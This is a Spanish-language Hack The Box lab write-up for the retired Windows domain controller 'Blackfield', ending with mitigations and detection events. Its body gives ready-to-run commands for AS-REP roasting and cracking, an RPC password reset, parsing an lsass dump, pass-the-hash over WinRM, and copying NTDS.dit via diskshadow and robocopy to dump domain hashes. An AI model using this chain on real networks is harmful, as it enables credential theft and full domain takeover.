---
machine: Blackfield
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, as-rep-roast, smb, lsass, sebackupprivilege, ntds]
---

# Blackfield — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Controlador de dominio con un usuario sin preautenticación Kerberos: **AS-REP roasting** y crackeo. Con esa cuenta se cambia la contraseña de otro usuario, se entra a un recurso compartido forense con un **volcado de lsass**, se extrae el hash de `svc_backup` y, con **SeBackupPrivilege**, se copian `NTDS.dit` y el hive SYSTEM por shadow copy hasta el hash de Administrator.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 5986, 9389
```

Dominio `BLACKFIELD.local`. Se enumeran usuarios y se comprueba preautenticación:

```bash
impacket-GetADUsers -all -dc-ip <DC> blackfield.local/
nxc ldap <DC> -u '' -p '' --asreproast asrep.txt
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip <DC> -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

El usuario `support` no tiene preautenticación y su contraseña cae con un diccionario. Con esas credenciales se enumeran recursos SMB:

```bash
nxc smb <DC> -u support -p '<password>' --shares
```

`profiles$` es legible y `forensic` aparece al forzar la contraseña de otro usuario.

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

`support` tiene permiso para cambiar la contraseña de `audit2020` por RPC:

```bash
rpcclient -U 'support%<password>' <DC>
```

```text
setuserinfo2 audit2020 23 '<NuevaPassword>!'
```

Con `audit2020` se accede al recurso `forensic`, que contiene un volcado de memoria de `lsass.exe`. Se descarga y se procesa:

```bash
smbclient //<DC>/forensic -U 'audit2020%<NuevaPassword>!'
pypykatz lsa minidump lsass.DMP
```

Del volcado sale el hash NT de `svc_backup`.

## Escalada de privilegios

`svc_backup` tiene **SeBackupPrivilege** y acceso WinRM:

```bash
evil-winrm -i <DC> -u svc_backup -H <hash>
```

```powershell
whoami /priv
```

Se crea una shadow copy y se copian los ficheros del directorio:

```powershell
diskshadow /s script.txt
# script.txt:
# set context persistent nowriters
# add volume c: alias bk
# create
# expose %bk% z:
robocopy /b z:\windows\ntds . ntds.dit
robocopy /b z:\windows\system32\config . SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

El hash de Administrator permite `wmiexec`/`psexec` y leer ambas flags.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un usuario sin preautenticación Kerberos entrega un hash crackeable sin credenciales: hay que auditar el flag `DONT_REQ_PREAUTH`.
- Los permisos de cambio de contraseña por RPC son escalada lateral silenciosa.
- Un volcado de lsass en un share «forense» es credenciales en claro para quien pueda leerlo.
- `SeBackupPrivilege` equivale a lectura total del disco: con `diskshadow` se saltan los bloqueos de NTDS.dit.
- Detección: AS-REP requests masivos, `setuserinfo2` desde cuentas no administrativas y `diskshadow`/`robocopy /b` sobre NTDS.

## Mitigaciones y detección

- Activar la preautenticación Kerberos, usar contraseñas largas en cuentas de servicio y forzar AES.
- Detección: 4768 con `PreAuthType=0` y 4769 con RC4 fuera de la línea base.
- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
